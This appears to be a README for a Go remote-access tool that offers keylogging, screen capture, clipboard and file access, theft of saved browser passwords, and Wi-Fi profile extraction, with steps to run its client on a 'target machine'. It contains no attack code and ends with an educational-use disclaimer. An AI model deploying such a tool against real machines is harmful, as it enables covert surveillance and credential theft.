# SpectreRAT
Welcome to SpectreRAT, a remote administration tool (RAT) built by a 15-year-old developer to explore networking and security concepts. This tool allows remote control of a machine, including keylogging, file management, and system monitoring.

# Features
1. System Info: Fetch details like IP address, country, username, and OS.

2. Screen Capture: Stream the screen to the server.

3. Keystroke Logging: Capture and send keystrokes back.

4. Clipboard Access: Access clipboard data.

5. File Operations: Upload and download files from the target machine.

6. Browser Info: Extract saved passwords from browsers like Chrome and Brave.

7. Wi-Fi Info: Retrieve saved Wi-Fi profiles.

# Requirements
Before running, make sure to install Go and the following dependencies:

`go get github.com/atotto/clipboard`

`go get github.com/go-toast/toast`

`go get github.com/kbinani/screenshot`

`go get github.com/lxn/walk`

`go get github.com/moutend/go-hook/pkg/keyboard`

`go get github.com/moutend/go-hook/pkg/types`

`go get modernc.org/sqlite`

`go get fyne.io/v2/fyne`

`github.com/shirou/gopsutil/v4/cpu`

`github.com/shirou/gopsutil/v4/host`

`github.com/shirou/gopsutil/v4/mem`
 
# Installation
Install Go: Ensure Go is installed on your system.

1. Clone the Repo: Clone the repository to your local machine.
   
`git clone https://github.com/ZeyTroX-exe/SpectreRAT.git`

3. Install Dependencies: Run the go get commands listed above.

4. Run the Server: Build and run the server-side admin panel with:

`go run server.go`

4. Run the Client: Build and run the client agent on the target machine with:

`go run client.go`

# Important
This tool is intended for educational purposes only. Use it responsibly and legally. The goal is to learn about programming, networking, and security.

License
Feel free to contribute or use this project, but do so responsibly.
